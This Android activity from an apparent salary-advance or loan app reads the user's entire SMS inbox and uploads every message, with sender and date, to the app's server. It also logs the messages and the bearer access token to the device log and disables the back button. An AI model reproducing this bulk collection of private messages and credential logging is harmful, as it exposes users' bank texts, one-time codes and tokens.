package rutherfordit.com.instasalary.activities;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.icu.text.SimpleDateFormat;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.cardview.widget.CardView;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import es.dmoral.toasty.Toasty;
import rutherfordit.com.instasalary.R;
import rutherfordit.com.instasalary.extras.MySingleton;
import rutherfordit.com.instasalary.extras.Urls;
import rutherfordit.com.instasalary.model.SMSData;

public class ReadSMS extends AppCompatActivity {

    private static final int MY_PERMISSIONS_REQUEST_READ_SMS = 101;
    JSONArray jsonArray;
    SharedPreferences sharedPreferences;
    String UserAccessToken, Ph_Number;
    CardView loader_sms;
    List<SMSData> sms;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_read_sms);

        if (ContextCompat.checkSelfPermission(ReadSMS.this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {

            if (ActivityCompat.shouldShowRequestPermissionRationale(ReadSMS.this, Manifest.permission.READ_SMS)) {
                init();
            } else {
                ActivityCompat.requestPermissions(ReadSMS.this, new String[]{Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS}, MY_PERMISSIONS_REQUEST_READ_SMS);
            }
        } else {
            init();
        }

    }

    private void init() {

        loader_sms = findViewById(R.id.loader_sms);
        loader_sms.setVisibility(View.VISIBLE);
        sms = new ArrayList<>();

        sharedPreferences = getSharedPreferences("mySharedPreference", Context.MODE_PRIVATE);
        UserAccessToken = "Bearer " + sharedPreferences.getString("AccessToken", "");
        Ph_Number = sharedPreferences.getString("Phone", "");

        getSMS();
        makejson(sms);

    }

    private void getSMS() {

        Uri uriSMSURI = Uri.parse("content://sms/inbox");
        Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);

        if (cur.getCount() > 0) {

            while (cur.moveToNext()) {
                SMSData smsData = new SMSData();
                smsData.setBody(cur.getString(cur.getColumnIndexOrThrow("body")));
                smsData.setNumber(cur.getString(cur.getColumnIndex("address")));

                int dateIndex = cur.getColumnIndex("date");
                long timeMillis = cur.getLong(dateIndex);
                Date date = new Date(timeMillis);

                String formattedDate = null;

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    formattedDate = new SimpleDateFormat("yyyy-MM-dd hh:mm").format(date);
                    smsData.setDate(formattedDate);
                } else {
                    smsData.setDate(String.valueOf(date));
                }

                sms.add(smsData);
            }
        } else {
            loader_sms.setVisibility(View.GONE);
            Toasty.info(getApplicationContext(), "Empty Inbox", Toast.LENGTH_SHORT).show();
            Intent i = new Intent(getApplicationContext(), GetAdharDetailsActivity.class);
            startActivity(i);
        }
    }

    private void makejson(List<SMSData> sms_list) {

        Log.e("sms", "makejson: " + sms_list);

        jsonArray = new JSONArray();

        for (int i = 0; i < sms_list.size(); i++) {

            JSONObject jsonObject = new JSONObject();

            String address = sms_list.get(i).getNumber();
            String body = sms_list.get(i).getBody();
            String date = sms_list.get(i).getDate() + ":00";

            try {

                jsonObject.put("mobile_no", Ph_Number);
                jsonObject.put("address", address);
                jsonObject.put("body", body);
                jsonObject.put("date_time", date);

            } catch (JSONException e) {
                e.printStackTrace();
            }

            jsonArray.put(jsonObject);

            //save(getApplicationContext(),jsonArray);

        }

        Log.d("Aray", "getSMS: " + jsonArray);

        request(jsonArray);

    }

    private void request(JSONArray jsonArray) {

        JSONObject jsonObject = new JSONObject();

        try {
            jsonObject.put("sms", jsonArray);
        } catch (JSONException e) {
            e.printStackTrace();
        }

        Log.d("Aray", "OBJ: " + jsonObject);


        JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(Request.Method.POST, Urls.SMS_DATA, jsonObject, new Response.Listener<JSONObject>() {
            @Override
            public void onResponse(JSONObject response) {

                if (response != null) {
                    loader_sms.setVisibility(View.GONE);
                    Intent i = new Intent(getApplicationContext(), GetAdharDetailsActivity.class);
                    startActivity(i);
                }

            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

                loader_sms.setVisibility(View.GONE);
                Log.d("Aray", "onErrorResponse: " + error.getMessage());

            }
        }) {
            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String> params = new HashMap<String, String>();
                params.put("Content-Type", "application/json");
                params.put("Accept", "application/json");
                params.put("Authorization", UserAccessToken);
                Log.d(":parama", "getHeaders: " + params);
                return params;
            }
        };

        MySingleton.getInstance(ReadSMS.this).addToRequestQueue(jsonObjectRequest);

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        if (requestCode == MY_PERMISSIONS_REQUEST_READ_SMS) {
            if (grantResults.length > 0) {
                boolean cont_perm = grantResults[1] == PackageManager.PERMISSION_GRANTED;
                boolean sms_perm = grantResults[0] == PackageManager.PERMISSION_GRANTED;

                if (sms_perm) {
                    init();
                } else {
                    ActivityCompat.requestPermissions(ReadSMS.this, new String[]{Manifest.permission.READ_SMS}, MY_PERMISSIONS_REQUEST_READ_SMS);
                }
            } else {
                Toasty.warning(getApplicationContext(), "Permission IS Denied", Toast.LENGTH_LONG).show();
            }
        }
    }

    @Override
    public void onBackPressed() {
        //  super.onBackPressed();
    }
}
